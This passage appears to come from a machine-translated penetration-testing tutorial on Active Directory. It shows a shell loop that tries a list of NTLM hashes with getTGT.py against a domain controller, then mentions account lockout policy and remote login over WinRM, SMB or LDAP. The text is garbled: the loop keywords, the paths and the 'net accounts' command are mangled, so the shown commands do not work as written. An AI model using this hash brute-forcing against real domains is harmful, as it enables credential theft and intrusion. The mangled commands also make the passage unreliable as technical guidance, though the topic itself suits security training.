...
```
for i in $ (cat / tmp / hash); run getTGT.py domain.local/alice@dc.domain.local -hashes: $ i -dc-ip dc.domain.local; echo $ i; ready | tee /tmp/tgt_log.txt
```
...
However, do not forget about the password policy in the domain, if it is installed then the brute-force method will block the target account. To query the "Account Lockout Policy" policy, you can run "network accounts / domain" command. After successfully selecting the password, you will be able to use it to remotely log in with WINRM, SMB, LDAP services, or to load the registry tree using for example:
